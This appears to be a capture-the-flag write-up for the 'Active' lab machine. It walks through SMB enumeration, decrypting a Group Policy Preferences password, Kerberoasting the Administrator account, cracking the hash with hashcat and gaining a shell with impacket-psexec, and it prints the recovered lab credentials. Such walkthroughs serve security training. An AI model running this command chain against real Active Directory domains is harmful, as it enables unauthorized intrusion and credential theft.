## 2026-07-17
---

Difficulty: Easy

# User Flag

First do a NMAP Scanning to check the ports.
``` bash
sudo nmap 10.129.11.155 -sC -sV -oA nmap/active
```

Various services are visible, but the SMB is the most interesting one.
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-24 01:55:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

The `active.htb` is now added to the hosts file.

Then, the SMB Shares are now enumerated.
```
smbclient -N -L //active.htb
```

Based on the results, the share `replication` is available to read.
The contents can be get through this set of commands.
```
mask "" 
recurse ON 
prompt OFF 
mget * 
```

A `Groups.xml` file has be found with an encrypted password inside the share.
The password can be decrypted using the `Gpp-Decrypt` tool.
```
git clone https://github.com/t0thkr1s/gpp-decrypt.git
```

The resulting credentials are.
`active.htb\SVC_TGS:GPPstillStandingStrong2k18`

The Users share can now be accessed through `smbclient`.
```
smbclient -U 'SVC_TGS' -L //active.htb
```

The flag can be grabbed from this share.
User flag obtained!

# Root Flag

Since the WinRM is not available, another method will be attempted.
However, according to the TGS Privileges, the Administrator account has a Service Principal Name (SPN) associated with it, which makes it vulnerable to a Kerberoasting attack.
```
impacket-GetUserSPNs -request -dc-ip active.htb 'active.htb/SVC_TGS'
```

The admin hash has been returned.
The resulting hash can be cracked using the command.
```bash
hashcat -m 13100 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

The resulting credentials are.
`Administrator:Ticketmaster1968`

According to `netexec`, the C Share is writable.
```
netexec smb active.htb -u 'Administrator' -p 'Ticketmaster1968' --shares
```

This will allow PSEXEC.
```
impacket-psexec active.htb/Administrator@active.htb
```

The root flag has been obtained!